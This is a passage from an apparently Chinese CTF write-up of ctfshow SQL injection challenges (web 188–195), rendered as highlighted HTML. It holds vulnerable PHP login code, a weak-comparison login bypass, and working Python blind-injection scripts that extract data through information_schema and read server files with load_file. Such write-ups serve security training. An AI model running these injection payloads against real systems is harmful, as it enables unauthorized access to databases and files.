punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>  <span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>  <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>  <span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>  <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">==</span><span class=\"token function\">intval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>      <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>      <span class=\"token function\">array_push</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'data'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'flag'</span><span class=\"token operator\">=&gt;</span><span class=\"token variable\">$flag</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token punctuation\">}</span></pre></td></tr></tbody></table></figure><p>弱等于，字符串和数字比较，当字符串 = 0 恒成立，故可 username=0，password=0</p>\n<h1 id=\"web-189\"><a class=\"anchor\" href=\"#web-189\">#</a> web 189</h1>\n<p>提示 flag 在 api/index.php 文件中</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> time <span class=\"token keyword\">import</span> sleep</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://fc44b510-a611-4cd6-86f7-2d734b41e643.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlagIndex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    head <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    tail <span class=\"token operator\">=</span> <span class=\"token number\">300</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>    <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(locate('ctfshow{',\"</span> <span class=\"token operator\">+</span> <span class=\"token string\">\"load_file('/var/www/html/api/index.php'))&gt;{0},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>            <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>            head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>            tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">return</span> mid</pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">getFlag</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    i <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        head <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        tail <span class=\"token operator\">=</span> <span class=\"token number\">127</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>        i <span class=\"token operator\">=</span> i <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token keyword\">while</span> head <span class=\"token operator\">&lt;</span> tail<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>            mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>head <span class=\"token operator\">+</span> tail<span class=\"token punctuation\">)</span> <span class=\"token operator\">&gt;&gt;</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>                <span class=\"token string\">'username'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">\"if(ascii(substr(load_file('/var/www/html/api/index.php'),{0},1))&gt;{1},0,1)\"</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">format</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>                                                                                                               <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>                                                                                                                   mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>                <span class=\"token string\">'password'</span><span class=\"token punctuation\">:</span> <span class=\"token string\">'1'</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>            <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>            r <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token punctuation\">,</span> data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span> <span class=\"token operator\">==</span> r<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>                head <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>            <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>                tail <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"45\"></td><td><pre>            mid <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>        <span class=\"token keyword\">if</span> head <span class=\"token operator\">!=</span> <span class=\"token number\">32</span> <span class=\"token keyword\">and</span> head <span class=\"token operator\">!=</span> <span class=\"token builtin\">ord</span><span class=\"token punctuation\">(</span><span class=\"token string\">'}'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>            result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>head<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>result <span class=\"token operator\">+</span> <span class=\"token string\">\"}\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>            <span class=\"token keyword\">break</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>    index <span class=\"token operator\">=</span> getFlagIndex<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>    getFlag<span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span></pre></td></tr></tbody></table></figure><h1 id=\"web-190\"><a class=\"anchor\" href=\"#web-190\">#</a> web 190</h1>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 17:59:09</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://4cd908a0-fce3-4625-81ad-18085f85af6e.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ascii(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-191\"><a class=\"anchor\" href=\"#web-191\">#</a> web 191</h1>\n<p>过滤了 <code>ascii</code> ，使用 <code>ord</code></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token triple-quoted-string string\">'''</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>Author       : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>Github       : https://github.com/dpm12345</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>Date         : 2023-07-15 17:17:55</pre></td></tr><tr><td data-num=\"5\"></td><td><pre>LastEditors  : dpm12345 1006975692@qq.com</pre></td></tr><tr><td data-num=\"6\"></td><td><pre>LastEditTime : 2023-07-15 18:05:57</pre></td></tr><tr><td data-num=\"7\"></td><td><pre>Description  : </pre></td></tr><tr><td data-num=\"8\"></td><td><pre>'''</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">import</span> requests</pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">import</span> string</pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>pwd <span class=\"token operator\">=</span> <span class=\"token string\">\"1\"</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>result <span class=\"token operator\">=</span> <span class=\"token string\">\"\"</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>str_set <span class=\"token operator\">=</span> string<span class=\"token punctuation\">.</span>ascii_letters <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>digits <span class=\"token operator\">+</span> string<span class=\"token punctuation\">.</span>punctuation </pre></td></tr><tr><td data-num=\"16\"></td><td><pre>url <span class=\"token operator\">=</span> <span class=\"token string\">\"http://d6c927bd-730c-4a1c-a8d0-de2deaca515b.challenge.ctf.show/api/\"</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">while</span> <span class=\"token boolean\">True</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    left <span class=\"token operator\">=</span> <span class=\"token number\">32</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    right <span class=\"token operator\">=</span> <span class=\"token number\">128</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    <span class=\"token keyword\">while</span> left <span class=\"token operator\">&lt;</span> right<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>        mid <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>left <span class=\"token operator\">+</span> right<span class=\"token punctuation\">)</span> <span class=\"token operator\">//</span> <span class=\"token number\">2</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>mid<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(table_name) from information_schema.tables where table_schema=database()\"</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>        <span class=\"token comment\"># payload = \"select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='ctfshow_fl0g'\"</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>        payload <span class=\"token operator\">=</span> <span class=\"token string\">\"select group_concat(f1ag) from ctfshow_fl0g\"</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>        data <span class=\"token operator\">=</span> <span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            <span class=\"token string\">\"username\"</span> <span class=\"token punctuation\">:</span> <span class=\"token string-interpolation\"><span class=\"token string\">f\"admin' and if(ord(substr((</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>payload<span class=\"token punctuation\">}</span></span><span class=\"token string\">),</span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>index<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1)) &gt; </span><span class=\"token interpolation\"><span class=\"token punctuation\">{</span>mid<span class=\"token punctuation\">}</span></span><span class=\"token string\">,1,2) ='1\"</span></span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token string\">\"password\"</span> <span class=\"token punctuation\">:</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>        <span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token comment\"># print(data)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>        res <span class=\"token operator\">=</span> requests<span class=\"token punctuation\">.</span>post<span class=\"token punctuation\">(</span>url<span class=\"token operator\">=</span>url<span class=\"token punctuation\">,</span>data<span class=\"token operator\">=</span>data<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token string\">\"密码错误\"</span>  <span class=\"token operator\">==</span> res<span class=\"token punctuation\">.</span>json<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>            left <span class=\"token operator\">=</span> mid <span class=\"token operator\">+</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>            right <span class=\"token operator\">=</span> mid</pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        <span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        time<span class=\"token punctuation\">.</span>sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.5</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    result <span class=\"token operator\">+=</span> <span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span>left<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"result:\"</span><span class=\"token punctuation\">,</span>result<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr></tbody></table></figure><h1 id=\"web-195\"><a class=\"anchor\" href=\"#web-195\">#</a> web 195</h1>\n<p>查询语句</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 拼接 sql 语句查找指定 ID 用户</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token variable\">$sql</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"select pass from ctfshow_user where username = <span class=\"token interpolation\"><span class=\"token punctuation\">{</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">}</span></span>;\"</span><span class=\"token punctuation\">;</span></pre></td></tr></tbody></table></figure><p>返回逻辑</p>\n<figure class=\"highlight php\"><figcaption data-lang=\"PHP\"></figcaption><table><tbody><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 密码检测</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token function\">is_numeric</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span><span class=\"token operator\">=</span><span class=\"token string single-quoted-string\">'密码只能为数字'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token function\">json_encode</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ret</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\">// 密码判断</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$row</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'pass'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">==</span> <span class=\"token variable\">$password</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">{</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token variable\">$ret</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'msg'</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'登陆成功'</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">}</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">preg_match</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'/ |\\*|\\x09|\\x0a|\\x0b|\\x0c|\\x0d|\\xa0|\\x00|\\#|\\x23|\\'|\\\"|select|union|or|and|\\x26|\\x7c|file|into/i'</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$username</span><span class=\"token punctuation\">)</span><span class=\"token 